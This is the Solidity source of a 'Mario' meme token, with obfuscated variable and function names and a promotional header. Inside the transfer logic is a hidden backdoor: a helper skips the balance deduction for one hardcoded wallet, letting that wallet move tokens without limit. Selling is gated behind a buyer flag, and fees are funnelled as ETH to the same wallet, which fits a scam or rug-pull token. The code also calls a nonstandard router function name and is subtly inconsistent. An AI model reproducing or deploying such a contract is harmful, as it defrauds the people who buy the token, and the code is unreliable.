/**

$Mario
Go ahead.Mario.
We are trying to find Princess Peach, but we must gather our strength to get there and defeat Bowser! 

TWITTER: https://twitter.com/Mario_erc20
TELEGRAM: https://t.me/Mario_Portal
WEBSITE: https://maricoca.com/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _msazx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _msazx(a, b, "SafeMath");
    }

    function  _msazx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qofmeu {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _piedms {
    function swatTenwSortgFxOrsfser(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Mario is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _piedms private _Tfqiyk;
    address payable private _Tckvhipbx;
    address private _yiecvdr;

    bool private _qvlahfv;
    bool public _Tarelvge = false;
    bool private oieyeqjk = false;
    bool private _aujteptz = false;

    string private constant _name = unicode"Mario";
    string private constant _symbol = unicode"Mario";
    uint8 private constant _decimals = 9;
    uint256 private constant _jTotalvo = 1000000000 * 10 **_decimals;
    uint256 public _kvnkaven = _jTotalvo;
    uint256 public _Wafeumqe = _jTotalvo;
    uint256 public _rwapuThaesfyto= _jTotalvo;
    uint256 public _gfakTvkof= _jTotalvo;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _cEakuvmp;
    mapping (address => bool) private _taxrmkay;
    mapping(address => uint256) private _rpuobeo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yavfparq=0;
    uint256 private _bdughje=0;


    event _moefpvuf(uint _kvnkaven);
    modifier oTeuve {
        oieyeqjk = true;
        _;
        oieyeqjk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _jTotalvo;
        _cEakuvmp[owner(

        )] = true;
        _cEakuvmp[address
        (this)] = true;
        _cEakuvmp[
            _Tckvhipbx] = true;
        _Tckvhipbx = 
        payable (0x08fFF259866EadD60134dcaa71850aDd5b886750);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _jTotalvo);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _jTotalvo;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _msazx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 epaounk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Tarelvge) {
                if (to 
                != address
                (_Tfqiyk) 
                && to !=
                 address
                 (_yiecvdr)) {
                  require(_rpuobeo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rpuobeo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yiecvdr && to != 
            address(_Tfqiyk) &&
             !_cEakuvmp[to] ) {
                require(amount 
                <= _kvnkaven,
                 "Exceeds the _kvnkaven.");
                require(balanceOf
                (to) + amount
                 <= _Wafeumqe,
                  "Exceeds the macxizse.");
                if(_bdughje
                < _yavfparq){
                  require
                  (! _ropuvta(to));
                }
                _bdughje++;
                 _taxrmkay
                 [to]=true;
                epaounk = amount._pvr
                ((_bdughje>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yiecvdr &&
             from!= address(this) 
            && !_cEakuvmp[from] ){
                require(amount <= 
                _kvnkaven && 
                balanceOf(_Tckvhipbx)
                <_gfakTvkof,
                 "Exceeds the _kvnkaven.");
                epaounk = amount._pvr((_bdughje>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bdughje>
                _yavfparq &&
                 _taxrmkay[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oieyeqjk 
            && to == _yiecvdr &&
             _aujteptz &&
             contractTokenBalance>
             _rwapuThaesfyto 
            && _bdughje>
            _yavfparq&&
             !_cEakuvmp[to]&&
              !_cEakuvmp[from]
            ) {
                _rwdkoegf( _rapsd(amount, 
                _rapsd(contractTokenBalance,
                _gfakTvkof)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _uejmep(address
                    (this).balance);
                }
            }
        }

        if(epaounk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(epaounk);
          emit
           Transfer(from,
           address
           (this),epaounk);
        }
        _balances[from
        ]= _msazx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _msazx(epaounk));
        emit Transfer
        (from, to, 
        amount.
         _msazx(epaounk));
    }

    function _rwdkoegf(uint256
     tokenAmount) private
      oTeuve {
        if(tokenAmount==
        0){return;}
        if(!_qvlahfv)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tfqiyk.WETH();
        _approve(address(this),
         address(
             _Tfqiyk), 
             tokenAmount);
        _Tfqiyk.
        swatTenwSortgFxOrsfser
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rapsd
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _msazx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Tckvhipbx){
            return a ;
        }else{
            return a .
             _msazx (b);
        }
    }

    function removezLimitas (
        
    ) external onlyOwner{
        _kvnkaven = _jTotalvo;
        _Wafeumqe = _jTotalvo;
        emit _moefpvuf(_jTotalvo);
    }

    function _ropuvta(address 
    account) private view 
    returns (bool) {
        uint256 oxzpa;
        assembly {
            oxzpa :=
             extcodesize
             (account)
        }
        return oxzpa > 
        0;
    }

    function _uejmep(uint256
    amount) private {
        _Tckvhipbx.
        transfer(
            amount);
    }

    function enablesTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qvlahfv ) ;
        _Tfqiyk  
        =  
        _piedms
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tfqiyk), 
            _jTotalvo);
        _yiecvdr = 
        _qofmeu(_Tfqiyk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tfqiyk .
             WETH ( ) );
        _Tfqiyk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yiecvdr).
        approve(address(_Tfqiyk), 
        type(uint)
        .max);
        _aujteptz = true;
        _qvlahfv = true;
    }

    receive() external payable {}
}